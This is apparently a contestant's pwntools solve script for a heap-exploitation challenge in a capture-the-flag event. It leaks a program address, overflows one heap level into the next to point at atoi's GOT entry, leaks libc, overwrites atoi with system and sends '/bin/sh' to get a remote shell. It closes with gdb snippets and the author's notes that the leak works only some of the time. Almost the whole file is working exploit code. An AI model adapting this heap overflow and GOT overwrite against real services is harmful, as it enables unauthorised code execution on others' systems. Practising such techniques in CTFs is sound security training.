from pwn import *

binary = "./chall"
context.binary = binary

p = process('./chall_patched')
p = remote("chall.lac.tf", 31338)
elf = ELF(binary)
libc = ELF("./libc.so.6")


def create_level(idx):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"Enter level index: ", str(idx).encode())

def edit_level(data):
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b"Enter level data: ", data)

def test_level():
    p.sendlineafter(b"Choice: ", b"3")


def explore(idx):
    p.sendlineafter(b"Choice: ", b"4")
    p.sendlineafter(b"Enter level index: ", str(idx).encode())

def reset():
    p.sendlineafter(b"Choice: ", b"5")

s = '''
b *edit_level
b *test_level
#b *create_level
#b * explore
#b * create_level+231
#b * get_num
'''
#gdb.attach(p, s)

# getting the main address leak
p.recvuntil(b"Welcome to the heap-like game engine!\n")
leak = p.recvline().strip()
log.info(f"Raw leak: {leak}")
main_addr = int(leak.split(b"A welcome gift: ")[1], 16)
elf.address = main_addr - elf.sym['main']
log.info(f"Main address: {hex(main_addr)}")

atoi_addr = main_addr + 0x29d6

create_level(0)  
create_level(1) 
create_level(2) 

explore(1)
create_level(0)
reset()

explore(0) # going into the first chunk to overflow into the second chunk
payload1 = flat(
	
	b"B" * 0x20, # padding 
	0, # metadata
	0x0000000000000071, # size
	atoi_addr - 0x40 # Address to leak, as it loads like this - lea    rcx, [rdx + 0x40]
)
edit_level(payload1) # writes the above payload from first level overflowing up to the second
reset()


explore(1) # now curr points to the second chunk 
explore(0) # now curr points to atoi - 0x40
test_level() # leaks curr+0x40 now!

# parsing the leaks
#sleep(5)
leak = p.recvuntil(b'\x7f', drop = False)[-6:].ljust(8, b'\x00')
leak = u64(leak)
#print(hex(printf_addr))
sys_addr = leak - libc.sym['atoi'] + libc.sym['system']

edit_level(p64(sys_addr))
p.sendlineafter(b"Choice: ", b"/bin/sh\x00")
p.interactive()




'''
 ► 0x555a362e937a <edit_level+149>    call   fgets@plt                   <fgets@plt>
        s: 0x555a362ec058 ◂— 0
        n: 0x40
        stream: 0x7f8b9611b8e0 (_IO_2_1_stdin_) ◂— 0xfbad208b

'''




'''
► 0x5644523d66a2 <main+64>    call   menu                        <menu>
        rdi: 0x7f2871c12a20 ◂— 0
        rsi: 0x7f2871c10b03 (_IO_2_1_stdin_+131) ◂— 0xc12a20000000000a /* '\n' */
        rdx: 0xfbad208b
        rcx: 0x5644523d9020 (fgets@got[plt]) —▸ 0x7f2871a8a490 (system) ◂— test rdi, rdi

'''

# now there's just one problem
# my solve script is not consistently getting the shell
# It seems to be that the address leak part is not consistent on the remote and 
'''
# locally 
Level data: \xa0\x04\x08\x1c5\x7f\x00\x00\xb6\x00\xa8\xb3\xc1U\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P0\xa8\xb3\xc1U\x00\x00

# remotely 
Level data: \xa0\xb4Kd\x94z\x00\x00\xb6\xb0\xcb 8V\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\xe0\xcb 8V\x00\x00

Level data: \xa0\xa4    ww{\x00\x00\xb6 \xd2|SX\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00PP\xd2|SX\x00\x00

Level data: \xa0tJ\x87\x16}\x00\x00\xb6@o\xa7\xe7Z\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Ppo\xa7\xe7Z\x00\x00

It's most of the time not leaking atoi's libc address but sometimes it does. 
Level data: \xa0\xa4"\xb6\x86\x7f\x00\x00\xb6\xd0 @&\\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x00!@&\\x00\x00

That's when I get the shell 
'''
